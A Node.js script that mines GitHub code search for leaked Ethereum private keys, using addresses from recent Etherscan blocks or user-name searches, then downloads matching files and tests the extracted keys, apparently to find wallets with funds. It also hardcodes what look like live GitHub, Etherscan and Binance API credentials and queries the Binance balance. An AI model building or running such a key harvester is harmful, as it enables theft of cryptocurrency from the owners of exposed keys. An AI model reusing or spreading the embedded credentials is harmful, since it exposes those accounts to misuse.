const {Octokit} = require("@octokit/rest")
const {parseForPrivateKeys} = require("./parseForPrivateKeys")
const ethers2 = require("ethers")
const {testPrivateKeys} = require("./testPrivateKeys")
const Web3 = require("web3")
const Promise = require("bluebird")
const { throttling } = require("@octokit/plugin-throttling");
const { retry } = require("@octokit/plugin-retry");
const names = require('./names.json')
const gitApiKey = "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"
//const gitApiKey = "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"
const etherscanApiKey = "KIP9EMNW2G9Y23TPCS21H6JGD6I9I2WW7T"
const ccxt = require("ccxt")
const BINANCE_API_KEY="8PDfQ2lSIyHPWdNAHNIaIoNy3MiiMuvgwYADbmtsKo867B0xnIhIGjPULsOtvMRk"
const BINANCE_API_KEY_SECRET="tbUiyZ94l0zpYOlKs3eO1dvLNMOSbOb2T1T0eT0I1eogH9Fh8Htvli05eZ1iDvra"
const etherscanAPI = require("etherscan-api").init(etherscanApiKey)

const exchange = new ccxt.binance({apiKey: BINANCE_API_KEY, secret: BINANCE_API_KEY_SECRET})

exchange.fetchBalance().then(console.log)
let MyOcto = Octokit.plugin(
  throttling,
  retry
)

 const octo = new MyOcto({
  auth: gitApiKey, 
  throttle: {
    onRateLimit: (retryAfter, options) => {
     // console.log("rate limited", options)
      if(options.request.retryCount < 5) {
        octo.log.info('retrying after ${retryAfter} seconds!')
        return true
      }
    },
    onSecondaryRateLimit: (retryAfter, options, octokit) => {
      // does not retry, only logs a warning
      octokit.log.warn(
        `Secondary quota detected for request ${options.method} ${options.url}`
      );
    },
  }
})

const startingAddresses = []
const getBlock = async () => {
  return await etherscanAPI.proxy.eth_blockNumber()
}

const searchForPrivKeysViaEtherscan = async (address, page) => {
       const blockNumber = await etherscanAPI.proxy.eth_blockNumber()
  const block = await etherscanAPI.proxy.eth_getBlockByNumber(blockNumber.result)
	let transactions = block.result.transactions
	let addresses = new Set(transactions.map(item => [item.from, item.to]).reduce((a,b)=> [...a,...b]))
	addresses = Array.from(addresses)
     
  return Promise.each(addresses, async address => {
         let query = 'priv '+ address
      setTimeout(() => {
          octo.rest.search.code({q:query, order:"asc", sort: "indexed", page, per_page:100}).then(res => {
         let items = res.data.items
            console.log(address, items.length)
         return Promise.each(items, async item=> {
		//console.log(item)
           try {
            const content = await octo.rest.git.getBlob({
              owner: item.repository.owner.login,
              repo: item.repository.name,
              file_sha: item.sha
            })
            //console.log(content)
            const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
            //console.log(codeFile)
            // console.log("keys")
            let keys = parseForPrivateKeys(codeFile)
            //console.log(keys)
          //  console.log("---------")
            testPrivateKeys(keys)
          }
          catch(err) {
            console.log(err)
          }
           
         })
	  })    
       }, 50)
    })
  }

const searchProfilesForPrivateKeys = async (page, name, per_page) => {
  let apiCalls = 0
  if(!name) {
    return
  }
  octo.rest.search.users({q:name, order:"asc", page, per_page}).then(res => {
    apiCalls += 1
    let profiles = res.data.items
   // console.log(profiles)
    let queryForProfile = "web3"
    let queries = profiles.map(profile =>{
      let query = {q: "User: " + profile.login + " " + queryForProfile}
      return query
    })
      
      //{q:"User:" + profile.login, queryProfileFor,  per_page:1, page}))
    //console.log(queries[0])
    Promise.each(queries, async query => {
      apiCalls += 1
     // console.log(query)
     let results = await octo.rest.search.code(query)
      let codeSnippets = results.data.items
      if(codeSnippets.length !== 0) {
         console.log("parsing 30 code files for private key", codeSnippets.length)
      Promise.each(codeSnippets, async snippet => {
        apiCalls += 1 
        //console.log("api calls ", apiCalls)//console.log(Object.keys(snippet))
        const content = await octo.rest.git.getBlob({
             owner: snippet.repository.owner.login,
             repo: snippet.repository.name,
             file_sha: snippet.sha
           })
           //console.log(content)
           const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
        //console.log(codeFile)
        let keys = parseForPrivateKeys(codeFile)
       // console.log(keys)
        testPrivateKeys(keys)
           searchProfilesForPrivateKeys(page+=1, name, per_page)
      })
    }
      else {
           searchProfilesForPrivateKeys(page+=1, name, per_page)
      }

    })
  }).catch(console.log)
}

  const searchForPrivKeysViaGithub = async (page) => {
    
    let query = ''
      setTimeout(() => {
          octo.rest.search.code({q:query, order:"asc", sort: "indexed", page, per_page:30}).then(async res => {
         let items = res.data.items
           console.log(items.length)
            Promise.each(items , async item => {
                const content = await octo.rest.git.getBlob({
             owner: item.repository.owner.login,
             repo: item.repository.name,
             file_sha: item.sha
           })
              //console.log(content)
            const codeFile = Buffer.from(content.data.content, "base64").toString("utf-8")
              //console.log(codeFile)
              let keys = parseForPrivateKeys(codeFile)
        // console.log(keys)
         //  console.log("---------")
           testPrivateKeys(keys)
              searchForPrivKeysViaGithub(page+=1)
        })
         
            
      }).catch(err => console.log(err))
         //searchForPrivKeysViaGithub(page+=1)
       }, 50)
    
  } 
  

//searchPrivKeysViaEtherscan()
//searchForPrivKeysViaEtherscan()



const ethContractAddress = "0x28c3b043BbccBc646211Af23F7Eaa5eE86F9C70d"

const testAddress = "0xd83eB40979cA0Dabe945E22629A72765dc9A39bD"
//testPrivateKeys(["9cf3e34444a91a01307eb7a50210aa8a3faacb8dcbfb3435d2acbca9765f4460"])


//searchForPrivKeysViaGithub(1)



let network = "rinkeby"

//start()
//getBlock().then(console.log)
//console.log("got block number", block)
//ethAPI.account.txList().then(console.log)

//searchProfilesForPrivateKeys(1, 'Harry', 30)
// for(let i=0; i< names.length; i++) {
//   searchProfilesForPrivateKeys(1, names[i])
// }
